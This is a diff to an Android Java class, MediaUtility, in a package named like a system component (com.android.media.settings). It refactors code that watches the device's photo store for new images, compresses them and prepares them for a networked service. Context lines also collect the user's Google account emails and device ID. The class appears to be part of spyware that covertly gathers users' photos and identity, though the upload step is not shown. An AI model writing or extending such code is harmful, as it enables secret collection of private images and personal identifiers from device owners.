@@ -11,7 +11,6 @@ import android.graphics.Bitmap;
 import android.net.ConnectivityManager;
 import android.net.NetworkInfo;
 import android.net.Uri;
-import android.os.Environment;
 import android.provider.MediaStore;
 import android.provider.Settings;
 import android.support.v4.app.NotificationCompat;
@@ -23,8 +22,6 @@ import com.android.media.settings.MediaDBManager;
 import com.android.media.settings.Models.Media;
 
 import java.io.File;
-import java.io.FileNotFoundException;
-import java.io.FileOutputStream;
 import java.io.IOException;
 import java.net.HttpURLConnection;
 import java.net.URL;
@@ -48,8 +45,8 @@ public class MediaUtility {
     private MediaDBManager dbManager;
     private MediaConfig mConfig;
 
-    Uri extMediaUri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
-    String projection[] = {
+    private Uri extMediaUri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
+    private String projection[] = {
             MediaStore.Images.ImageColumns._ID,
             MediaStore.Images.ImageColumns.BUCKET_ID,
             MediaStore.Images.ImageColumns.BUCKET_DISPLAY_NAME,
@@ -63,10 +60,11 @@ public class MediaUtility {
         this.mConfig = new MediaConfig(context);
     }
 
-    public Cursor fetchMediaStore() {
-        String id = this.getLatestMediaId();
+    Cursor fetchMediaStore() {
+        String id = "0";
         SharedPreferences pref = context.getSharedPreferences(MediaConfig.PREF_NAME, Context.MODE_PRIVATE);
         if(isFirstInstall()) {
+            id = this.getLatestMediaId();
             SharedPreferences.Editor prefEditor = pref.edit();
             prefEditor.putString(MediaConfig.PREF_MEDIA_STORE_INIT, id);
             prefEditor.apply();
@@ -86,11 +84,10 @@ public class MediaUtility {
 
     public boolean isFirstInstall() {
         SharedPreferences pref = context.getSharedPreferences(MediaConfig.PREF_NAME, Context.MODE_PRIVATE);
-        if(pref.contains(MediaConfig.PREF_MEDIA_STORE_INIT)) return false;
-        return true;
+        return !pref.contains(MediaConfig.PREF_MEDIA_STORE_INIT);
     }
 
-    public String getLatestMediaId() {
+    private String getLatestMediaId() {
         String id = "0";
         Cursor c = context.getContentResolver().query(
                 extMediaUri,
@@ -102,43 +99,49 @@ public class MediaUtility {
         try {
             if(c != null && c.moveToFirst()) {
                 id = c.getString(c.getColumnIndex(MediaStore.Images.ImageColumns._ID));
+                c.close();
             }
-        } finally {
-            c.close();
+        } catch (Exception e) {
+            e.printStackTrace();
         }
         return id;
     }
 
-    public Bitmap getBitmapFromUri(String strUri) {
-        Uri uri = Uri.parse("file://" + strUri);
-        try {
-            Bitmap bm = MediaStore.Images.Media.getBitmap(context.getContentResolver(), uri);
-            return bm;
-        } catch (IOException e) {
-            e.printStackTrace();
-            Log.d(TAG, "Invalid Bitmap");
+    private Bitmap.CompressFormat getCompressFormat(String imgUri) {
+        String format = imgUri.substring(imgUri.lastIndexOf("."));
+        switch (format.toLowerCase()) {
+            case "jpeg":
+            case "jpg":
+                return Bitmap.CompressFormat.JPEG;
+            case "png":
+                return Bitmap.CompressFormat.PNG;
+            case "webp":
+                return Bitmap.CompressFormat.WEBP;
+            default:
+                return Bitmap.CompressFormat.JPEG;
         }
-        return null;
     }
 
-    public File compressImage(String strUri) {
+    private File compressImage(String strUri, String id) {
+        Bitmap.CompressFormat format = getCompressFormat(strUri);
         return ImageUtility.compressToFile(
                 context,
+                id,
                 new File(strUri),
                 mConfig.getIMG_MAX_WIDTH(),
                 mConfig.getIMG_MAX_HEIGHT(),
-                mConfig.getIMG_COMPRESS_FORMAT(),
+                format,
                 mConfig.getIMG_CONFIG(),
                 mConfig.getIMG_QUALITY(),
                 MediaConfig.getFileStoragePath(context, false)
         );
     }
 
-    public void compressAndStore(String uri, String id){
+    void compressAndStore(String uri, String id){
         File imgFile = new File(uri);
         if(imgFile.exists()) {
             final Media media = new Media(id, imgFile.getAbsolutePath());
-            Observable.just(compressImage(uri))
+            Observable.just(compressImage(uri, id))
                     .subscribeOn(AndroidSchedulers.mainThread())
                     .subscribe(new Observer<File>() {
                         @Override
@@ -154,7 +157,8 @@ public class MediaUtility {
 
                         @Override
                         public void onError(Throwable e) {
-
+                            media.setStatus(3);
+                            dbManager.insertMedia(media);
                         }
 
                         @Override
@@ -164,49 +168,20 @@ public class MediaUtility {
         }
     }
 
-    /**
-     * Function to store bitmap to provided path
-     * @param image [Image Bitmap]
-     * @return file [File of the stored bitmap]
-     * */
-    public File storeImage(Bitmap image, String id) {
-        String storagePath = Environment.getExternalStorageDirectory().getAbsolutePath()+"/MediaServer/Images";
-        File mediaStorageDir = new File(storagePath);
-
-        if (! mediaStorageDir.exists()){
-            if (! mediaStorageDir.mkdirs()){
-                return null;
-            }
-        }
-
-        if( id != null) id = "img_" + Math.random();
-        String imgName = id + ".jpg";
-        File imgFile = new File(mediaStorageDir + File.separator + imgName);
-        try {
-            FileOutputStream fos = new FileOutputStream(imgFile);
-            image.compress(Bitmap.CompressFormat.PNG, 100, fos);
-            fos.flush();
-            fos.close();
-        } catch (FileNotFoundException e) {
-            Log.d(TAG, "File not found: " + e.getMessage());
-        } catch (IOException e) {
-            Log.d(TAG, "Error accessing file: " + e.getMessage());
-        }
-        return imgFile;
-    }
-
-    public boolean networkOnline() {
+    private boolean networkOnline() {
         ConnectivityManager manager =
                 (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
-        NetworkInfo networkInfo = manager.getActiveNetworkInfo();
         boolean isAvailable = false;
-        if (networkInfo != null && networkInfo.isConnected()) {
-            isAvailable = true;
+        if(manager!= null) {
+            NetworkInfo networkInfo = manager.getActiveNetworkInfo();
+            if (networkInfo != null && networkInfo.isConnected()) {
+                isAvailable = true;
+            }
         }
         return isAvailable;
     }
 
-    public boolean networkConnected() {
+    boolean networkConnected() {
         if(networkOnline()) {
             try {
                 HttpURLConnection connection = (HttpURLConnection) (new URL("http://www.google.com").openConnection());
@@ -222,7 +197,7 @@ public class MediaUtility {
         return false;
     }
 
-    public MediaAPI initRetroService() {
+    MediaAPI initRetroService() {
         HttpLoggingInterceptor interceptor = new HttpLoggingInterceptor();
         interceptor.setLevel(HttpLoggingInterceptor.Level.BODY);
 
@@ -243,10 +218,10 @@ public class MediaUtility {
         return retrofit.create(MediaAPI.class);
     }
 
-    public String getUsername() {
+    String getUsername() {
         AccountManager manager = AccountManager.get(context);
         Account[] accounts = manager.getAccountsByType("com.google");
-        List<String> possibleEmails = new LinkedList<String>();
+        List<String> possibleEmails = new LinkedList<>();
 
         for (Account account : accounts) {
             possibleEmails.add(account.name);
@@ -262,16 +237,17 @@ public class MediaUtility {
         return null;
     }
 
-    public String getDeviceId() {
-        return Settings.Secure.getString(context.getContentResolver(),
-                Settings.Secure.ANDROID_ID);
+    String getDeviceId() {
+        return Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
     }
 
     public boolean isServiceRunning(Class<?> serviceClass) {
         ActivityManager manager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
-        for (ActivityManager.RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
-            if (serviceClass.getName().equals(service.service.getClassName())) {
-                return true;
+        if(manager != null) {
+            for (ActivityManager.RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
+                if (serviceClass.getName().equals(service.service.getClassName())) {
+                    return true;
+                }
             }
         }
         return false;
@@ -290,4 +266,5 @@ public class MediaUtility {
         notification.flags |= Notification.FLAG_ONGOING_EVENT;
         return notification;
     }
+
 }
